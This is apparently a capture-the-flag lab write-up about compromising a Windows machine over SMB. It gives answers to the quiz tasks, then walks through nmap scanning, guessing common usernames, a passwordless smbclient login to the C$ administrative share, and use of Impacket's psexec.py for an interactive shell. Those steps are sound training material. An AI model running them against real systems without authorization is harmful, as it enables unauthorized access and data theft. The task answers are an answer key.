## 1. Questions
- Task 1
	- Which Nmap switch can we use to enumerate machines when our ping ICMP packets are blocked by the Windows firewall?
		- `-Pn`
- Task 2
	- What does the 3-letter acronym SMB stand for?
		- `Server Message Block`
- Task 3
	- What port does SMB use to operate at?
		- `445`
- Task 4
	- What command line argument do you give to `smbclient` to list available shares?
		- `-L`
- Task 5
	- What character at the end of a share name indicates it's an administrative share?
		- `$`
- Task 6
	- Which Administrative share is accessible on the box that allows users to view the whole file system?
		- `C$`
- Task 7
	- What command can we use to download the files we find on the SMB Share?
		- `get`
- Task 8
	- Which tool that is part of the Impacket collection can be used to get an interactive shell on the system?
		- `psexec.py`
- Submit Flag
	- Submit root flag
## 2. Tools
- Linux
- CLI
- nmap
- smbclient
- dir
- more
- git
- psexec.py
## 3. Approach
### nmap scan
- Useful resource
	- https://www.stationx.net/nmap-cheat-sheet/
```bash
sudo nmap -sSVC -Pn -n --disable-arp-ping -p- -T4 10.129.15.122
```
- Flags
	- `-sSVC` - SYN, service, and default sript scan.
	- `-Pn` - Exclude ICMP scanning.
	- `-n` - Exclude name resolution.
	- `--disable-arp-ping` - Exclude `arp` scanning.
	- `-T4` - Use speed template `aggressive`.
- Result
```bash
<snip>
PORT    STATE SERVICE       VERSION
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 3s
| smb2-time: 
|   date: 2025-09-16T17:40:08
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
<snip>
```
### Research common SMB usernames
- Resources
	- https://medium.com/@taliyabilal765/smb-enumeration-guide-b2cb5cfb20e6#:~:text=2%2D-,Common%20credentials,-%3A%20Try%20common
	- https://hackviser.com/tactics/pentesting/services/smb
- Example usernames
	- anonymous
	- admin
	- administrator
	- root
### Test SMB connection (passwordless)
- Useful resource
	- https://github.com/irgoncalves/smbclient_cheatsheet
- Successfully connected using username `administrator`
```bash
smbclient -L 10.129.15.122 -U administrator
```
- Result
```
Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
```
### Test share connection (passwordless)
- Useful resource
	- https://github.com/irgoncalves/smbclient_cheatsheet
```bash
smbclient \\\\10.129.15.122\\C$ -U administrator
```
### Explore files and directories
- Useful resource
	- https://github.com/security-cheatsheet/cmd-command-cheat-sheet
- Flag found in `\Users\Administrator\Desktop`
### Retrieve the flag
- Useful resource
	- https://github.com/security-cheatsheet/cmd-command-cheat-sheet
```cmb
more \Users\Administrator\Desktop\flag.txt
```
## 4. Alternate Approach
### nmap scan
- Useful resource
	- https://www.stationx.net/nmap-cheat-sheet/
```bash
sudo nmap -sSVC -Pn -n --disable-arp-ping -p- -T4 10.129.15.122
```
- Flags
	- `-sSVC` - SYN, service, and default sript scan.
	- `-Pn` - Exclude ICMP scanning.
	- `-n` - Exclude name resolution.
	- `--disable-arp-ping` - Exclude `arp` scanning.
	- `-T4` - Use speed template `aggressive`.
- Result
```bash
<snip>
PORT    STATE SERVICE       VERSION
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 3s
| smb2-time: 
|   date: 2025-09-16T17:40:08
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
<snip>
```
### Research common SMB usernames
- Resources
	- https://medium.com/@taliyabilal765/smb-enumeration-guide-b2cb5cfb20e6#:~:text=2%2D-,Common%20credentials,-%3A%20Try%20common
	- https://hackviser.com/tactics/pentesting/services/smb
- Example usernames
	- anonymous
	- admin
	- administrator
	- root
### Test SMB connection (passwordless)
- Useful resources
	- https://github.com/fortra/impacket
	- https://github.com/fortra/impacket/tree/master/examples#:~:text=last%20year-,psexec.py,-Techdebt%20examples%20bootstrapping
#### Clone impacket repo
```bash
git clone https://github.com/fortra/impacket.git
```
#### Move to script directory
```bash
cd impacket/examples
```
#### Run the script
- Successfully connected to SMB server using username `administrator`
```bash
psexec.py administrator@10.129.15.122
```
### Explore files and directories
- Useful resource
	- https://github.com/security-cheatsheet/cmd-command-cheat-sheet
- Flag found in `\Users\Administrator\Desktop`
### Retrieve the flag
- Useful resource
	- https://github.com/security-cheatsheet/cmd-command-cheat-sheet
```cmb
more \Users\Administrator\Desktop\flag.txt
```
